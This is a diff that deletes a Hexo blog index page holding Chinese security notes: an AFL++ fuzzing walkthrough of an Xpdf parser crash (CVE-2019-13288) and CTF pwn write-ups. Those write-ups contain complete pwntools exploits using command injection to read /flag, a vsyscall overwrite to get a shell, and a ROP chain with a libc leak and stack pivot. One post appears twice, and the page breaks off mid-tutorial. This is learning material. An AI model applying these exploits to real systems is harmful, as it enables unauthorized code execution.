@@ -1,902 +1,690 @@
-
-
-
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	<title> [ your blog title ]</title>
-	
-	
-	<!-- stylesheets list from _config.yml -->
-	
-	<link rel="stylesheet" href="/css/PreciousJoy.css">
-	
-	<link rel="stylesheet" href="/css/top-bar.css">
-	
-	<link rel="stylesheet" href="/css/menu-outer.css">
-	
-	<link rel="stylesheet" href="/css/content-outer.css">
-	
-	<link rel="stylesheet" href="/css/bottom-outer.css">
-	
-	<link rel="stylesheet" href="/css/atom-one-dark.css">
-	
-	<link rel="stylesheet" href="/css/recent-posts-item.css">
-	
-	<link rel="stylesheet" href="/css/article-sidebar-toc.css">
-	
-	<link rel="stylesheet" href="/css/jquery.fancybox.min.css">
-	
-	<link rel="stylesheet" href="/css/search.css">
-	
-	<link rel="stylesheet" href="/css/toc.css">
-	
-	<link rel="stylesheet" href="/css/sidebar.css">
-	
-	<link rel="stylesheet" href="/css/archive.css">
-	
-	<link rel="stylesheet" href="/css/jquery.mCustomScrollbar.min.css">
-	
-	<link rel="stylesheet" href="/css/Z-last-cover-others.css">
-	
-	
-	
-<meta name="generator" content="Hexo 6.3.0"></head>
-
-
-
-
-<body id="wrapper">
-
-	<div id="">
-		
-		<div id="top-bar">
-			
-			<div id="avatar-box">
-				<img 
-				class="avatar"
-				src="/images/default-avatar.jpg" 
-				alt="avatar">
-			</div>
-
-			<div id="top-bar-text">
-				<div id="top-bar-title">
-					pa1n
-				</div>
-				<div id="top-bar-slogan">
-					
-				</div>
-			</div>
-
-		</div>
-
-		<div id="menu-outer">
-			<div id="menu-inner">
-				
-				
-				<div class="menu-item">
-					<a href="/">Home</a>
-				</div>
-				
-				<div class="menu-item">
-					<a href="/about">About</a>
-				</div>
-				
-				<div class="menu-item">
-					<a href="/archives">Archives</a>
-				</div>
-				
-
-				<div class="menu-item menu-item-search">
-					
-  <span class="local-search local-search-google local-search-plugin">
-      <input type="search" placeholder="站内搜索" id="local-search-input" class="local-search-input-cls" style="">
-      <div id="local-search-result" class="local-search-result-cls"></div>
-  </span>
-	
-				</div>
-
-			</div>
-		</div>
-
-		<div id="content-outer">
-			<div id="content-inner">
-
-				
-
-<div id="recent-posts-box">
-
+  <meta charset="utf-8">
   
-  <div id="recent-posts">
-    <!-- <h1>Recent Posts</h1> -->
-    
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/11/26/FUZZ/xpdf/" class="item-title">xpdf</a>
-      
-      <time datetime="2024-11-26T12:58:53.000Z">
-        2024-11-26
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!--  CVE-2019-13288
-搭建xpdf环境
-cd $HOME
-mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/
-
-# 相关依赖
-sudo apt install build-essential
-sudo apt update &amp;&amp; sudo apt install -y build-essential gcc
-
-# Download Xpdf 3.02 &amp;&amp; build Xpdf
-wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz
-tar -xvzf xpdf-3.02.tar.gz
-cd xpdf-3.02
-
-./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;
-make
-make install
-
-# Download PDF examples to test Xpdf
-cd $HOME/fuzzing_xpdf
-mkdir pdf_examples &amp;&amp; cd pd -->
-        <!-- </div> -->
-
-        
-        <p> <a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p>
-<p>搭建xpdf环境</p>
-<pre><code class="lang-py">cd $HOME
-mkdir fuzzing_xpdf &amp;&amp; cd fuzzing_xpdf/
-
-# 相关依赖
-sudo apt install build-essential
-sudo apt update &amp;&amp; sudo apt install -y build-essential gcc
-
-# Download Xpdf 3.02 &amp;&amp; build Xpdf
-wget https://dl.xpdfreader.com/old/xpdf-3.02.tar.gz
-tar -xvzf xpdf-3.02.tar.gz
-cd xpdf-3.02
-
-./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;
-make
-make install
-
-# Download PDF examples to test Xpdf
-cd $HOME/fuzzing_xpdf
-mkdir pdf_examples &amp;&amp; cd pdf_examples
-wget https://github.com/mozilla/pdf.js-sample-files/raw/master/helloworld.pdf
-wget http://www.africau.edu/images/default/sample.pdf
-wget https://www.melbpc.org.au/wp-content/uploads/2017/10/small-example-pdf-file.pdf
-</code></pre>
-<p>测试Xpdf</p>
-<pre><code class="lang-py">$HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdfinfo -box -meta $HOME/fuzzing_xpdf/pdf_examples/helloworld.pdf
-</code></pre>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126211601210.png" alt="image-20241126211601210"></p>
-<p>搭建fuzz环境</p>
-<pre><code class="lang-py">sudo apt-get update
-sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools cargo libgtk-3-dev
-# try to install llvm 14 and install the distro default if that fails
-sudo apt-get install -y lld-14 llvm-14 llvm-14-dev clang-14 || sudo apt-get install -y lld llvm llvm-dev clang
-sudo apt-get install -y gcc-$(gcc --version|head -n1|sed &#39;s/\..*//&#39;|sed &#39;s/.* //&#39;)-plugin-dev libstdc++-$(gcc --version|head -n1|sed &#39;s/\..*//&#39;|sed &#39;s/.* //&#39;)-dev
-sudo apt-get install -y ninja-build # for QEMU mode
-sudo apt-get install -y cpio libcapstone-dev # for Nyx mode
-sudo apt-get install -y wget curl # for Frida mode
-sudo apt-get install -y python3-pip # for Unicorn mode
-git clone https://github.com/AFLplusplus/AFLplusplus
-cd AFLplusplus
-make distrib
-sudo make install
-
-#将afl添加到环境变量path中
-echo &#39;export PATH=$PATH:/home/hpp/AFLplusplus&#39; &gt;&gt; ~/.bashrc
-source ~/.bashrc
-</code></pre>
-<p>使用afl-clang-fast对Xpdf进行插桩</p>
-<p>先清理掉之前Xpdf编译好的文件</p>
-<pre><code class="lang-py">rm -r $HOME/fuzzing_xpdf/install
-cd $HOME/fuzzing_xpdf/xpdf-3.02/
-make clean
-</code></pre>
-<p>编译xpdf并用 <strong>afl-clang-fast</strong> 编译器，进行插桩</p>
-<pre><code class="lang-sh">export LLVM_CONFIG=&quot;llvm-config-11&quot;
-CC=$HOME/AFLplusplus/afl-clang-fast CXX=$HOME/AFLplusplus/afl-clang-fast++ ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;
-make
-make install
-</code></pre>
-<p>开始fuzz模糊测试</p>
-<p><strong>-i</strong>  :设置输入实例的文件夹</p>
-<p><strong>-o</strong> :设置用于存放模糊测试结果的文件夹</p>
-<p><strong>-s</strong>  :设置一个静态随机数作为种子</p>
-<p><strong>—</strong>  ：设置测试目标</p>
-<p><strong>@@</strong>  ：占位符，指代每一个输入文件</p>
-<pre><code class="lang-sh">afl-fuzz -i $HOME/fuzzing_xpdf/pdf_examples/ -o $HOME/fuzzing_xpdf/out/ -s 123 -- $HOME/fuzzing_xpdf/xpdf-3.02/xpdf/pdftotext @@ $HOME/fuzzing_xpdf/output
-</code></pre>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126230407645.png" alt="image-20241126230407645"></p>
-<p>在 <strong>~/fuzzing_xpdf/out/default/crashes</strong> 里有导致程序奔溃的输入</p>
-<pre><code class="lang-py">hpp@swikar:~/fuzzing_xpdf/out/default/crashes$ ls
-id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15
-id:000001,sig:11,src:000229,time:505563,execs:344967,op:havoc,rep:2
-id:000002,sig:11,src:001638,time:566771,execs:383537,op:havoc,rep:1
-id:000003,sig:11,src:001753+000851,time:820662,execs:526503,op:splice,rep:2
-README.txt
-</code></pre>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126233345559.png" alt="image-20241126233345559"></p>
-<p>将这些文件放到gdb中调试，看看是哪里出错</p>
-<p>首先重新编译</p>
-<pre><code class="lang-sh">rm -r $HOME/fuzzing_xpdf/install
-cd $HOME/fuzzing_xpdf/xpdf-3.02/
-make clean
-CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;
-make
-make install
-</code></pre>
-<p>然后gdb调试</p>
-<pre><code class="lang-she">gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/&lt;your_filename&gt; $HOME/fuzzing_xpdf/output
-</code></pre>
-<p>我这里是</p>
-<pre><code class="lang-shell">gdb --args $HOME/fuzzing_xpdf/install/bin/pdftotext $HOME/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001045,time:342537,execs:245377,op:havoc,rep:15 $HOME/fuzzing_xpdf/output
-</code></pre>
-<pre><code class="lang-py">pwndbg&gt; run
-#回溯用过的函数
-pwndbg&gt; bt
-#24055 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b1030, dict=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156
-#24056 0x00005555555ff51a in Parser::getObj (this=0x5555561b1030, obj=0x7fffffa71880, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94
-#24057 0x0000555555623714 in XRef::fetch (this=0x5555556cc230, num=7, gen=0, obj=0x7fffffa71880) at XRef.cc:823
-#24058 0x00005555555fa57e in Object::fetch (this=0x5555561b0c58, xref=0x5555556cc230, obj=0x7fffffa71880) at Object.cc:106
-#24059 0x000055555559c94c in Dict::lookup (this=0x5555561b0c00, key=0x55555564ca6f &quot;Length&quot;, obj=0x7fffffa71880) at Dict.cc:76
-#24060 0x00005555555fb269 in Object::dictLookup (this=0x7fffffa71b00, key=0x55555564ca6f &quot;Length&quot;, obj=0x7fffffa71880) at /home/hpp/fuzzing_xpdf/xpdf-3.02/xpdf/Object.h:253
-#24061 0x00005555555ff8f0 in Parser::makeStream (this=0x5555561b0b50, dict=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:156
-#24062 0x00005555555ff51a in Parser::getObj (this=0x5555561b0b50, obj=0x7fffffa71b00, fileKey=0x0, encAlgorithm=cryptRC4, keyLength=0, objNum=7, objGen=0) at Parser.cc:94
-# 发现一直在调用Parser::getObj 函数
-</code></pre>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241126234413379.png" alt="image-20241126234413379"></p>
-<p>查看Parser.cc:94的源码</p>
-<pre><code class="lang-c">while (!buf1.isCmd(&quot;&gt;&gt;&quot;) &amp;&amp; !buf1.isEOF()) &#123;
-      if (!buf1.isName()) &#123;
-    error(getPos(), &quot;Dictionary key must be a name object&quot;);
-    shift();
-      &#125; else &#123;
-    key = copyString(buf1.getName());
-    shift();
-    if (buf1.isEOF() || buf1.isError()) &#123;
-      gfree(key);
-      break;
-    &#125;
-      //不断调用getObj使程序奔溃
-    obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,
-                 objNum, objGen));
-      &#125;
-    &#125;
-</code></pre>
-<p>定位到这</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127005323239.png" alt="image-20241127005323239"></p>
-<p>由于本人代码能力一般，修复不了bug,通过chatgpt修复了一下</p>
-<p>在源码的基础上增加了一个次数的限制</p>
-<pre><code class="lang-c">//定义两个全局变量
-#define MAX_OBJ_CALLS 10000
-int callCount = 0;
-
-while (!buf1.isCmd(&quot;&gt;&gt;&quot;) &amp;&amp; !buf1.isEOF()) &#123;
-      if (!buf1.isName()) &#123;
-    error(getPos(), &quot;Dictionary key must be a name object&quot;);
-    shift();
-      &#125; else &#123;
-    key = copyString(buf1.getName());
-    shift();
-    if (buf1.isEOF() || buf1.isError()) &#123;
-      gfree(key);
-      break;
-    &#125;
-
-            // 增加调用次数限制
-        if (callCount &gt;= MAX_OBJ_CALLS) &#123;
-            error(getPos(), &quot;Too many calls to getObj, possible infinite loop&quot;);
-            gfree(key);
-            obj-&gt;initError();  // 初始化为错误对象
-            break;
-        &#125;
-        callCount++;  // 增加调用次数
-
-
-    obj-&gt;dictAdd(key, getObj(&amp;obj2, fileKey, encAlgorithm, keyLength,
-                 objNum, objGen));
-      &#125;
-    &#125;
-</code></pre>
-<p>这样可以有效限制调用次数</p>
-<p>再次make clean,重新插桩编译，因为输入而导致程序奔溃的bug已经没有了，但是跑了很久发现了另外一个……有空再看看吧</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127010137107.png" alt="image-20241127010137107"></p>
-<p>这是xpdf4.02中<code>Parser.cc</code>的部分源码</p>
-<pre><code class="lang-c">// 增加了递归的上限
-// Max number of nested objects.  This is used to catch infinite loops
-// in the object structure.
-#define recursionLimit 500
-
-// 增加了递归次数的检查
-  // array
-  if (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(&quot;[&quot;)) &#123;
-      ...
-  // dictionary or stream
-  &#125; else if (!simpleOnly &amp;&amp; recursion &lt; recursionLimit &amp;&amp; buf1.isCmd(&quot;&lt;&lt;&quot;)) &#123;
-      ...
-
-// 对比之前版本，发现多了 recursion 这个参数
-    // stream objects are not allowed inside content streams or
-    // object streams
-    if (allowStreams &amp;&amp; buf2.isCmd(&quot;stream&quot;)) &#123;
-      if ((str = makeStream(obj, fileKey, encAlgorithm, keyLength,
-                objNum, objGen, recursion + 1))) &#123;
-          ...
-</code></pre>
-<p>漏洞来源</p>
-<p>在 Xpdf 4.01.01 中，<code>Parser.cc</code> 文件中的 <code>Parser::getObj()</code> 函数可能通过精心构造的文件导致无限递归。远程攻击者可以利用此漏洞发动拒绝服务（DoS）攻击。此漏洞与 <strong>CVE-2018-16646</strong> 类似。</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241127010619274.png" alt="image-20241127010619274"></p>
-<hr>
-<h5 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h5><p>[1]:<a target="_blank" rel="noopener" href="https://blog.xmcve.com/2023/01/13/Fuzzing101学习笔记/#title-4">Fuzzing101学习笔记 - 星盟安全团队</a> </p>
-<p>[2]:<a target="_blank" rel="noopener" href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise 1">Fuzzing101/Exercise 1 at main · antonio-morales/Fuzzing101</a></p>
-<p>[3]:<a target="_blank" rel="noopener" href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288 : In Xpdf 4.01.01, the Parser::getObj() function in Parser.cc may cause infinite r</a></p>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/11/26/FUZZ/xpdf/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/11/20/trick/" class="item-title">trick</a>
-      
-      <time datetime="2024-11-20T14:03:02.000Z">
-        2024-11-20
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- ctfshow 单身杯Findyourgirlfriendstrstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1
-
-输入的s不能包含这些字符串，然后输入的s是 set -s,
-
-最后执行的是system(‘/bin/sh -c set -s),在sh内执行set -s,设置了shell输出选项而没有其他动作
-这里不能直接cat，因为远程环境没有给cat设置环境变量$PATH
-
-from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;pwn.challenge.ctf.show&quot;,28147)
-p=process(&quot;./girl&quot;)
-context.log_level=&quot;debug&quot;
-
-def dbg():
-    gdb.attach(p)
-    sleep(1)
-
-p.sendlineafter(&#39;games&#39;,&#39;1&#39;)
-
-payload=b&#39;set -s&#39;
-p.sendlineafter(&#39; -->
-        <!-- </div> -->
-
-        
-        <h4 id="ctfshow-单身杯"><a href="#ctfshow-单身杯" class="headerlink" title="ctfshow 单身杯"></a>ctfshow 单身杯</h4><h2 id="Findyourgirlfriend"><a href="#Findyourgirlfriend" class="headerlink" title="Findyourgirlfriend"></a>Findyourgirlfriend</h2><p>strstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120220602192.png" alt="image-20241120220602192"></p>
-<p>输入的s不能包含这些字符串，然后输入的s是 <strong>set -s</strong>,</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120221150711.png" alt="image-20241120221150711"></p>
-<p>最后执行的是<strong>system(‘/bin/sh -c set -s)</strong>,在sh内执行<strong>set -s</strong>,设置了shell输出选项而没有其他动作</p>
-<p>这里不能直接cat，因为远程环境没有给cat设置环境变量<strong>$PATH</strong></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120222324355.png" alt="image-20241120222324355"></p>
-<pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;pwn.challenge.ctf.show&quot;,28147)
-p=process(&quot;./girl&quot;)
-context.log_level=&quot;debug&quot;
-
-def dbg():
-    gdb.attach(p)
-    sleep(1)
-
-p.sendlineafter(&#39;games&#39;,&#39;1&#39;)
-
-payload=b&#39;set -s&#39;
-p.sendlineafter(&#39;girlfriend? &#39;,payload)
-p.sendline(&#39;/bin/cat /flag&#39;)
-
-
-p.interactive()
-</code></pre>
-<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>保护全开，有个后门函数</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223315744.png" alt="image-20241120223315744"></p>
-<p>rax在栈上</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223444114.png" alt="image-20241120223444114"></p>
-<p>这里用了vsyscall，在这里x64这是固定的地址</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223513544.png" alt=""></p>
-<p>设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流</p>
-<pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;pwn.challenge.ctf.show&quot;,28149)
-p=process(&quot;./1&quot;)
-context.log_level=&quot;debug&quot;
-
-ret=0xffffffffff600000
-
-
-gdb.attach(p)
-pause()
-p.send(p64(ret)*30+b&#39;\x13&#39;)
-p.sendline(&#39;/bin/sh&#39;)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/11/20/trick/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/11/20/trick/trick/" class="item-title">trick</a>
-      
-      <time datetime="2024-11-20T14:03:02.000Z">
-        2024-11-20
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- ctfshow 单身杯Findyourgirlfriendstrstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1
-
-输入的s不能包含这些字符串，然后输入的s是 set -s,
-
-最后执行的是system(‘/bin/sh -c set -s),在sh内执行set -s,设置了shell输出选项而没有其他动作
-这里不能直接cat，因为远程环境没有给cat设置环境变量$PATH
-
-from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;pwn.challenge.ctf.show&quot;,28147)
-p=process(&quot;./girl&quot;)
-context.log_level=&quot;debug&quot;
-
-def dbg():
-    gdb.attach(p)
-    sleep(1)
-
-p.sendlineafter(&#39;games&#39;,&#39;1&#39;)
-
-payload=b&#39;set -s&#39;
-p.sendlineafter(&#39; -->
-        <!-- </div> -->
-
-        
-        <h4 id="ctfshow-单身杯"><a href="#ctfshow-单身杯" class="headerlink" title="ctfshow 单身杯"></a>ctfshow 单身杯</h4><h2 id="Findyourgirlfriend"><a href="#Findyourgirlfriend" class="headerlink" title="Findyourgirlfriend"></a>Findyourgirlfriend</h2><p>strstr函数返回子字符串第一次出现的指针，然后这里右边是判断，返回0或1</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120220602192.png" alt="image-20241120220602192"></p>
-<p>输入的s不能包含这些字符串，然后输入的s是 <strong>set -s</strong>,</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120221150711.png" alt="image-20241120221150711"></p>
-<p>最后执行的是<strong>system(‘/bin/sh -c set -s)</strong>,在sh内执行<strong>set -s</strong>,设置了shell输出选项而没有其他动作</p>
-<p>这里不能直接cat，因为远程环境没有给cat设置环境变量<strong>$PATH</strong></p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120222324355.png" alt="image-20241120222324355"></p>
-<pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;pwn.challenge.ctf.show&quot;,28147)
-p=process(&quot;./girl&quot;)
-context.log_level=&quot;debug&quot;
-
-def dbg():
-    gdb.attach(p)
-    sleep(1)
-
-p.sendlineafter(&#39;games&#39;,&#39;1&#39;)
-
-payload=b&#39;set -s&#39;
-p.sendlineafter(&#39;girlfriend? &#39;,payload)
-p.sendline(&#39;/bin/cat /flag&#39;)
-
-
-p.interactive()
-</code></pre>
-<h2 id="CheckIn"><a href="#CheckIn" class="headerlink" title="CheckIn"></a>CheckIn</h2><p>保护全开，有个后门函数</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223315744.png" alt="image-20241120223315744"></p>
-<p>rax在栈上</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223444114.png" alt="image-20241120223444114"></p>
-<p>这里用了vsyscall，在这里x64这是固定的地址</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241120223513544.png" alt=""></p>
-<p>设计这玩意的初衷是限制了只有从vsyscall函数入口才能正常运行，避免gadget，这里是反复调用vsyscall不断调用ret破坏栈，具体调试不出来，直接报错了，只有栈上有.text段没清理干净，修改最低位就劫持了控制流</p>
-<pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;pwn.challenge.ctf.show&quot;,28149)
-p=process(&quot;./1&quot;)
-context.log_level=&quot;debug&quot;
-
-ret=0xffffffffff600000
-
-
-gdb.attach(p)
-pause()
-p.send(p64(ret)*30+b&#39;\x13&#39;)
-p.sendline(&#39;/bin/sh&#39;)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/11/20/trick/trick/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/11/18/qwnt2024/" class="item-title">qwnt2024</a>
-      
-      <time datetime="2024-11-18T14:56:02.000Z">
-        2024-11-18
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!-- sigin开了随机种子，输入要和随机数一样
-
-由于buf和seed在栈上，所以可以利用输入buf把seed给覆盖掉
-使用 libc=cdll.LoadLibrary(“./libc.so.6”) ，加载的就是特定的libc，然后利用libc的函数libc.srand(seed),得到的随机数和rand一样，后续就是用老套的orw就能解决，不过要栈迁移取去bss段上执行，因为在栈上的rop长度不够
-from pwn import*
-from ctypes import *
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,)
-p=process(&quot;./vuln&quot;)
-context.log_level=&quot;debug&quot;
-elf=ELF(&#39;./vuln&#39;)
-context(arch=&#39;amd64&#39;)
-#libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu -->
-        <!-- </div> -->
-
-        
-        <h4 id="sigin"><a href="#sigin" class="headerlink" title="sigin"></a>sigin</h4><p>开了随机种子，输入要和随机数一样</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241119202720831.png" alt="image-20241119202720831"></p>
-<p>由于buf和seed在栈上，所以可以利用输入buf把seed给覆盖掉</p>
-<p>使用 libc=cdll.LoadLibrary(“./libc.so.6”) ，加载的就是特定的libc，然后利用libc的函数libc.srand(seed),得到的随机数和rand一样，后续就是用老套的orw就能解决，不过要栈迁移取去bss段上执行，因为在栈上的rop长度不够</p>
-<pre><code class="lang-py">from pwn import*
-from ctypes import *
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,)
-p=process(&quot;./vuln&quot;)
-context.log_level=&quot;debug&quot;
-elf=ELF(&#39;./vuln&#39;)
-context(arch=&#39;amd64&#39;)
-#libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;)
-
-
-libc=cdll.LoadLibrary(&quot;./libc.so.6&quot;) 
-#
-def dbg():
-    gdb.attach(p)
-    pause()
-
-p.send(b&#39;a&#39;*14+p32(1))
-libc.srand(1)
-menu=0x4014E6
-for i in range(100):
-    k=libc.rand()%100+1
-    print(k)
-    p.sendafter(&#39;code:&#39;,p8(k))
-
-pop_rdi=0x401893
-p.sendafter(&#39;&gt;&gt;&#39;,p32(1))
-p.sendlineafter(&#39;Index: &#39;,p32(0))
-payload=b&#39;a&#39;*0x108+p64(pop_rdi)+p64(elf.got[&#39;puts&#39;])+p64(elf.plt[&#39;puts&#39;])+p64(menu)
-libc=ELF(&#39;/home/hpp/s/buu/how2heap/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#39;)
-p.sendlineafter(&#39;Note: &#39;,payload)
-puts=u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
-base=puts-libc.sym[&#39;puts&#39;]
-pop_rsi=0x202f8+base
-pop_rdx=0x1b92+base
-read=base+libc.sym[&#39;read&#39;]
-op=base+libc.sym[&#39;open&#39;]
-write=base+libc.sym[&#39;write&#39;]
-bss=0x4040A0
-
-leave=0x401591
-
-p.sendafter(&#39;Index: &#39;,p32(2))
-print(hex(op))
-
-payload=b&#39;b&#39;*0x108+p64(pop_rsi)+p64(bss)+p64(read)+p64(menu)
-p.sendlineafter(&#39;Note: &#39;,&#39;asdf&#39;)
-
-p.sendline(payload)
-
-p.sendline(&#39;./flag\x00&#39;)
-
-p.sendlineafter(&#39;Index: &#39;,p32(2))
-payload=b&#39;a&#39;*0x108+p64(pop_rsi)+p64(bss+0x200)+p64(read)+p64(menu)
-
-p.sendlineafter(&#39;Note: &#39;,payload)
-
-#orw
-
-payload=p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(op)
-payload+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss+0x200)+p64(pop_rdx)+p64(0x40)+p64(read)
-payload+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss+0x200)+p64(pop_rdx)+p64(0x40)+p64(write)
-p.sendline(payload)
-dbg()
-p.sendlineafter(&#39;Index: &#39;,p32(3))
-payload=b&#39;d&#39;*0xff+p64(bss+0x200-8)+p64(leave)
-p.sendafter(&#39;Note: &#39;,&#39;g&#39;*0x100)
-p.sendline(payload)
-print(hex(puts))
-#leak_base
-#p.sendline(payload)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2024/11/18/qwnt2024/"> Read more -->
-          </span>
-        </div>
-
-        
-    
-    <div class="recent-post-item">
-
-      <a href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/" class="item-title">沙箱</a>
-      
-      <time datetime="2024-11-13T13:48:38.000Z">
-        2024-11-13
-      </time>
-      
-      <!-- <div class="article-digest"> -->
-        <!--  目前对沙箱类型的题写一下，这块比较薄弱
-最常见的就是ret2syscall了，一般开了沙箱，只能用orw
-ret2syscall一般开了，禁用了execve,只能用orw读出flag
-
-来看下常用的几个函数，当把bin/sh或./flag读入bss时，read（0，bss,nb)，rdi=0，rsi=bss,rsi=nb;
-然后时open函数,open(‘flag’),    rdi=flag_addr(bss),rsi=0;
-读进bss+0x300,read(3,bss+0x300,nb),rdi=3,rsi=bss+0x300,rsi=nb;
-读出flag ，write(1,bss+0x300,nb), rdi=1,rsi=bss+0x300,rsi=nb;
-遇过一次坑就是，当把flag字符写进bss时，字符串应该时p.sendline(‘./flag\x00’),后面必须是空格，否则open函数是以加了\n来找flag文件，是找不到的，所以得加空格
-常用的exp
-from pwn import*
-from LibcSearcher import *
-#p=remote(&quo -->
-        <!-- </div> -->
-
-        
-        <p> 目前对沙箱类型的题写一下，这块比较薄弱</p>
-<p>最常见的就是ret2syscall了，一般开了沙箱，只能用orw</p>
-<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>一般开了，禁用了execve,只能用orw读出flag</p>
-<p><img src="https://hswikar.oss-cn-beijing.aliyuncs.com/image-20241116200238975.png" alt="image-20241116200238975"></p>
-<p>来看下常用的几个函数，当把bin/sh或./flag读入bss时，read（0，bss,nb)，rdi=0，rsi=bss,rsi=nb;</p>
-<p>然后时open函数,open(‘flag’),    rdi=flag_addr(bss),rsi=0;</p>
-<p>读进bss+0x300,read(3,bss+0x300,nb),rdi=3,rsi=bss+0x300,rsi=nb;</p>
-<p>读出flag ，write(1,bss+0x300,nb), rdi=1,rsi=bss+0x300,rsi=nb;</p>
